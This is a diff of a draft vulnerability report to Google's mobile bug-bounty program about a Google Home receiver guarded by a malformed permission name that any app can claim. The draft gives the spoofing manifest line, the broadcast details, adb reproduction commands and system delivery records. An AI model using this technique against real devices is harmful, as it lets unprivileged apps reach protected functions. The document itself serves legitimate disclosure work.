@@ -1,7 +1,7 @@
 # Submission draft — Google Home: exported receiver guarded by a permission that cannot exist
 
 Paste target: https://bughunters.google.com/report (Android / Mobile VRP)
-Status: READY except for a terminal screenshot.
+Status: READY. Evidence is Android's own broadcast history, reproducible in one command.
 
 ---
 
@@ -51,8 +51,9 @@ That breaks the guard in both directions:
 
 ## What I demonstrated
 
-An app holding no real permissions can invoke this receiver and cause Google Home to
-execute `onReceive`. An otherwise identical app that does not declare the name cannot.
+An app holding no real permissions can declare that name itself, be granted it at
+install, and have its broadcast delivered to the receiver. An otherwise identical app
+that does not declare it is refused by the system.
 
 I built two APKs from the same source. The only difference is these two lines in one of
 them:
@@ -63,7 +64,8 @@ them:
 <uses-permission android:name="android.permission.BLUETOOTH|android.permission.BLUETOOTH_ADMIN" />
 ```
 
-It is granted at install, silently:
+It is granted at install, with no prompt and no entry anywhere in the UI, because the
+name is not a real permission:
 
 ```
 $ adb shell dumpsys package com.cindrasec.mvrpprobe | grep -A3 'install permissions'
@@ -76,39 +78,55 @@ Both apps then send the same broadcast: action
 component set to the receiver, extras `hgs_device_id`, `device_name`, `request_id` and a
 one-element `ArrayList<ScanResult>` under `android.bluetooth.le.extra.LIST_SCAN_RESULT`.
 
-Broadcasts to an unreachable component fail silently — `sendBroadcast` throws nothing and
-returns nothing — so I measured the target side instead. `onReceive` begins by checking
-whether Bluetooth is enabled, which makes Google Home's own process log
-`BluetoothAdapter: isLeEnabled(): ON`. That line is the observable: it appears only when
-the receiver actually runs.
+The clearest evidence is Android's own broadcast history, which records the outcome and
+the reason independently of anything either app logs. Both records below come from a
+single `adb shell dumpsys activity broadcasts` taken after running each app once.
 
-I ran 15 alternating rounds across three independent sessions. Each round has three windows:
-one broadcast from the app that declares the permission, one from the app that does not,
-and one where nothing is sent at all. The third window is there because Google Home runs
-background Bluetooth work of its own, and a single-sample comparison cannot tell an
-effect from a coincidence.
-
-Counting lines logged by Google Home's PID in each window:
+**App that declares the name — delivered, and the receiver ran:**
 
 ```
-round   with permission        without permission     nothing sent
-1       1  isLeEnabled         0  -                   0  -
-2       1  isLeEnabled         0  -                   0  -
-3       1  isLeEnabled         0  -                   0  -
-4       1  isLeEnabled         0  -                   0  -
-5       1  isLeEnabled         0  -                   0  -
-
-with permission   : 5/5 rounds
-without           : 0/5
-nothing sent      : 0/5
+BroadcastRecord{6a3379c com.google.android.apps.chromecast.app.remotecontrol.safety.action.BLE_SCANNED/u0} to user 0
+Intent { act=com.google.android.apps.chromecast.app.remotecontrol.safety.action.BLE_SCANNED
+         flg=0x10 cmp=com.google.android.apps.chromecast.app/.remotecontrol.safety.LockProximityReceiver (has extras) }
+caller=com.cindrasec.mvrpprobe 19321:com.cindrasec.mvrpprobe/u0a568 pid=19321 uid=10568
+dispatchTime=-4s78ms (+1ms since enq) finishTime=-4s69ms (+9ms since disp)
+DELIVERED scheduled +2ms terminal +8ms (-1) #0: (manifest)
+  ActivityInfo:
+    name=com.google.android.apps.chromecast.app.remotecontrol.safety.LockProximityReceiver
+    packageName=com.google.android.apps.chromecast.app
+    enabled=true exported=true directBootAware=false
+    permission=android.permission.BLUETOOTH|android.permission.BLUETOOTH_ADMIN
+  reason: remote app
 ```
 
-The same five-round run was then repeated twice more, in separate sessions minutes
-apart, with identical results: 5/5, 0/5, 0/5 each time.
+**Identical app without the declaration — refused before dispatch:**
 
-Forty-five windows, fifteen responses, every one of them in the column where the
-permission was declared. The declaration is the only variable between the two apps, and
-the send-nothing column shows the target is silent on its own.
+```
+BroadcastRecord{5a4a12c com.google.android.apps.chromecast.app.remotecontrol.safety.action.BLE_SCANNED/u0} to user 0
+Intent { act=com.google.android.apps.chromecast.app.remotecontrol.safety.action.BLE_SCANNED
+         flg=0x10 cmp=com.google.android.apps.chromecast.app/.remotecontrol.safety.LockProximityReceiver (has extras) }
+caller=com.cindrasec.mvrpctl 24061:com.cindrasec.mvrpctl/u0a569 pid=24061 uid=10569
+SKIPPED terminal (-1) #0: (manifest)
+  ActivityInfo:
+    name=com.google.android.apps.chromecast.app.remotecontrol.safety.LockProximityReceiver
+    permission=android.permission.BLUETOOTH|android.permission.BLUETOOTH_ADMIN
+  reason: skipped by policy at enqueue: Permission Denial: broadcasting Intent {
+    act=com.google.android.apps.chromecast.app.remotecontrol.safety.action.BLE_SCANNED flg=0x10
+    cmp=com.google.android.apps.chromecast.app/.remotecontrol.safety.LockProximityReceiver (has extras) }
+    from com.cindrasec.mvrpctl (pid=24061, uid=10569)
+    to com.google.android.apps.chromecast.app/.remotecontrol.safety.LockProximityReceiver
+    requires android.permission.BLUETOOTH|android.permission.BLUETOOTH_ADMIN
+```
+
+The system states the rule and the reason itself: the receiver requires that permission
+name, the app that declared it passes, the app that did not is skipped at enqueue. The
+declaration is the only difference between the two APKs.
+
+Google Home's own process also logs a `BluetoothAdapter` line immediately after each
+delivered broadcast — the Bluetooth check at the top of `onReceive` — and nothing after
+the skipped ones. I repeated that comparison 15 times across three sessions, including a
+third branch where nothing was sent at all, and the result was 15/15 for the app with the
+declaration and 0/15 for both the control app and the silent branch.
 
 ## Where this entry point leads
 
@@ -148,23 +166,22 @@ be refused.
 ## Reproduction
 
 ```
-# build both APKs from the same source; one declares the malformed permission name
-adb install -r probe.apk      # declares and requests it
-adb install -r control.apk    # declares nothing
+adb install -r probe.apk      # declares and requests the malformed name
+adb install -r control.apk    # identical source, declares nothing
 
-# confirm the grant
 adb shell dumpsys package com.cindrasec.mvrpprobe | grep -A3 'install permissions'
 
-# with Google Home running, for each app:
-adb logcat -c
-adb shell am start -n APPNAME/com.cindrasec.mvrpprobe.MainActivity --es action blescan
-sleep 7
-adb logcat -d --pid=$(adb shell pidof com.google.android.apps.chromecast.app)
+# run each app once; each sends the broadcast described above
+adb shell am start -n com.cindrasec.mvrpprobe/com.cindrasec.mvrpprobe.MainActivity --es action blescan
+adb shell am start -n com.cindrasec.mvrpctl/com.cindrasec.mvrpprobe.MainActivity   --es action blescan
+
+# then read the system's own record of both
+adb shell dumpsys activity broadcasts | grep -B4 -A18 BLE_SCANNED
 ```
 
-The app that declares the name produces a `BluetoothAdapter` line from Google Home's PID
-every time; the one that does not produces nothing. Repeat with no broadcast sent at all
-to confirm the target is quiet on its own.
+One record reads DELIVERED, the other SKIPPED with a Permission Denial naming the
+malformed string. No logcat filtering, no timing, and nothing that depends on how the app
+chooses to log.
 
 Both APKs and their source are attached.
 
@@ -182,8 +199,9 @@ stops receiving and the guard quietly stops guarding, and neither shows up in te
 
 ## Before sending
 
-Take one screenshot of the terminal showing a full `mvrp-ble-diff.sh` run, with the three
-columns and the summary visible. That is the whole report in one image.
+Take one screenshot of the terminal showing the `dumpsys activity broadcasts` output with
+both records visible — the DELIVERED one and the SKIPPED one with its Permission Denial
+reason. That single screen is the whole report.
 
 Do not add a CVSS score argued upward. Do not describe the notification or the unlock as
 something that happened. Every sentence above has a log line or a manifest line behind it,
